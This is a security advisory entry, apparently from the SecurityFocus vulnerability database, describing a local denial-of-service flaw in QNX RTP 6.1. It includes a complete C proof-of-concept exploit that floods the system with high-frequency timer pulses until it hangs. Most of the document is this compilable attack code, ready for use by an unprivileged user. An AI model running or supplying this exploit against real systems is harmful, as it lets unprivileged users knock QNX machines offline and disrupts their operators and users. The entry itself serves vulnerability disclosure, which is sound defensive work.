source: http://www.securityfocus.com/bid/6114/info

A denial of service vulnerability has been discovered in QNX.

It has been reported that it is possible for unprivileged users to cause QNX systems to stop responding, by creating multiple timers containing specific characteristics.

It should be noted that this issue was reported for QNX 6.1. It is not yet known whether this issue affects other releases.

/*
 * QNX RTP 6.1 Local DoS exploit
 *
 * author: Pawel Pisarczyk <pawel@immos.com.pl>, 2002
 *
 * After compilation and output binary execution system hangs.
 */
 
#include <errno.h>
#include <stdio.h>
#include <stddef.h>
#include <stdlib.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/neutrino.h>
#include <inttypes.h>


int main(int argc, char *argv[])
{
	struct sigevent event;
	struct _itimer itimer;
	int chid;
	int tmid;
	int coid;
	int k;
		

	if ((chid = ChannelCreate(0)) < 0) {
		fprintf(stderr, "Can't create channel!\n");
		exit(-1);
	}
	
	if ((coid = ConnectAttach(0, getpid(), chid, 0, 0)) < 0) {
		fprintf(stderr, "Can't connect to channel!\n");
		exit(-1);
	}
	
	
	for (k = 0; k < 16; k++) {
	
		SIGEV_PULSE_INIT(&event, coid, 16, _PULSE_CODE_MINAVAIL + 1, k);
		
		if ((tmid = TimerCreate(CLOCK_REALTIME, &event)) < 0) {
			fprintf(stderr, "Can't create timer!\n");
			return -1;
		}


		itimer.nsec = 1000000;
		itimer.interval_nsec = 1000000;
		TimerSettime(tmid, 0, &itimer, NULL);
	}
	
	
	while (getc(stdin) != '#');
	return 0;
}